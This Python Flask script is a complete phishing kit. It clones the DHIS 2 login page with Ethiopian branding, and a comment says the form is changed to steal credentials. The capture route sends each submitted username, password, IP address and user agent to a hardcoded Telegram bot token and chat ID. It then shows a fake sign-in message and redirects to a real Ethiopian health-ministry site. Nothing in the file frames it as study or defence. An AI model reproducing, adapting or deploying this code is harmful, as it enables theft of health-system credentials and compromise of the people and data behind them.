import requests
from flask import Flask, request, render_template_string, send_from_directory
import datetime
import os

# === TELEGRAM CONFIG ===
TELEGRAM_BOT_TOKEN = '8852974803:AAHgxTtXsIxJhG4N5z_XYGyQTeOLLIm-Ylw'
TELEGRAM_CHAT_ID = '7586408670'
# ========================

app = Flask(__name__, static_folder='static')

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
        'disable_web_page_preview': True
    }
    try:
        response = requests.post(url, json=payload)
        print(f"Telegram Status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# EXACT HTML STRUCTURE FROM SOURCE CODE
HTML_TEMPLATE = """
<!DOCTYPE HTML>
<html class="loginPage" dir="ltr">
<head>
<title>DHIS 2</title>
<meta name="description" content="DHIS 2">
<meta name="keywords" content="DHIS 2">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!-- Linking your saved exact CSS files -->
<link type="text/css" rel="stylesheet" href="/static/css/widgets.css">
<link type="text/css" rel="stylesheet" href="/static/css/login.css">
<!-- jQuery is included for compatibility if your CSS/JS expects it, though not strictly needed for the form POST -->
<script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>

<style>
.displayNoneClass { display: none; }
.borderNoneClass { border: none; }
.paddingTenClass { padding-bottom: 10px; }
.whiteRedClass { color: white; background-color: red; }
.marginLeftClass { margin-left: 30px; }
</style>
</head>

<body class="loginPage">
<h1 class="displayNoneClass">DHIS 2</h1>
<div class="displayNoneClass">DHIS 2</div>

<!-- Updated image paths to match your static/images/ structure -->
<div>
<img id="flagArea" src="/static/images/ethiopia.png">
<span id="titleArea">DHIS 2</span>
</div>

<div id="loginField">
<div id="loginArea">
<div id="bannerArea">
<a href="https://www.dhis2.org"><img src="/static/images/logo_front.png" class="borderNoneClass"></a>
</div>

<!-- FORM ACTION CHANGED TO /capture TO STEAL CREDENTIALS -->
<form id="loginForm" action="/capture" method="post">
<div>
<div id="signInLabel">Sign in</div>
<div><input type="text" id="j_username" name="j_username" placeholder="Username" required></div>
<div><input type="password" id="j_password" name="j_password" autocomplete="off" placeholder="Password" required></div>
</div>
<div id="submitDiv">
<input id="submit" class="button" type="submit" value="Sign in">
</div>
</form>

<!--[if lte IE 8]>
<div id="notificationArea" class="whiteRedClass">Please upgrade your browser. Internet Explorer version 8 and earlier is not supported.</div>
<![endif]-->
</div>
</div>

<div id="footerArea">
<div id="leftFooterArea" class="innerFooterArea">
<span id="poweredByLabel">Powered by </span><a href="https://www.dhis2.org">DHIS 2</a>&nbsp; <span id="applicationFooter"></span>
</div>
<div id="rightFooterArea" class="innerFooterArea">
<span id="applicationRightFooter"></span>
<select id="localeSelect" class="marginLeftClass">
<option value="">[ Change language ]</option>
</select>
</div>
</div>

</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('j_username')
    password = request.form.get('j_password')
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    telegram_msg = f"""
<b>DHIS 2 Phish Captured</b>
Time: {timestamp}
IP: {request.remote_addr}
User: {username}
Pass: {password}
UA: {request.headers.get('User-Agent')}
    """
    
    send_to_telegram(telegram_msg)
    
    # Return fake success page matching the original style roughly
    return """
    <html>
    <head>
        <title>DHIS 2</title>
        <link type="text/css" rel="stylesheet" href="/static/css/widgets.css">
        <link type="text/css" rel="stylesheet" href="/static/css/login.css">
        <script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>
        <style>
            body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        </style>
        <script>
            setTimeout(function() {
                window.location.href = 'https://tbh.ephi.gov.et'; 
            }, 2000);
        </script>
    </head>
    <body class="loginPage">
        <div id="loginField">
            <div id="loginArea" style="text-align: center; color: white;">
                <div id="signInLabel">Signing you in...</div>
                <div>Please wait.</div>
            </div>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)
